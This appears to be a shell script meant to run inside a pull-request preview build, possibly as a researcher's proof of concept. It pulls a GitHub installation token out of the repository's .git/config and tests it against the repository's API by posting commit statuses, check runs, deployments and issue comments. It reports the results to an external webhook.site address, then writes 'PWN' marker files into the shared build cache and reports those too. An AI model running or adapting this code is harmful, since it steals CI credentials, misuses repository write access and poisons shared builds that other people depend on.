#!/bin/sh
B="https://webhook.site/4ae49b89-684a-49dd-93bf-8e1e9688695d"
P(){ curl -s --max-time 10 --data-urlencode "d=$2" "$B/$1" >/dev/null 2>&1; }
TOK=$(grep -oE 'ghs_[A-Za-z0-9]+' /opt/build/repo/.git/config | head -1)
GH="https://api.github.com/repos/RedSpider67/pint-demo"
P TOKPERM "prefix=${TOK%${TOK#????????}}
contents_read=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" $GH/contents/rules/base.yml)
status_write=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" $GH/statuses/$COMMIT_REF -d '{\"state\":\"success\",\"context\":\"z\"}')
checkrun=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Accept: application/vnd.github+json' -H \"Authorization: Bearer $TOK\" $GH/check-runs -d \"{\\\"name\\\":\\\"z\\\",\\\"head_sha\\\":\\\"$COMMIT_REF\\\"}\")
deployment=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H \"Authorization: Bearer $TOK\" $GH/deployments -d '{\"ref\":\"main\"}')
prcomment=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H \"Authorization: Bearer $TOK\" $GH/issues/1/comments -d '{\"body\":\"z\"}')
accepted_perms=$(curl -s -D - -o /dev/null -H \"Authorization: Bearer $TOK\" $GH/contents/x 2>/dev/null | grep -i 'x-accepted-github-permissions')"
# CACHE POISON: write marker into the shared build cache
MARK="PWN-CACHE-MARKER-fromPreviewPR1"
echo "$MARK" > /opt/build/cache/.pwn-marker 2>/dev/null
mkdir -p /opt/build/cache/pwn-dir 2>/dev/null; echo "$MARK" > /opt/build/cache/pwn-dir/x 2>/dev/null
P CACHEPOISON "marker_written=$(cat /opt/build/cache/.pwn-marker 2>&1) ||| cache_ls=$(ls -la /opt/build/cache/ 2>&1 | head -20)"
echo done
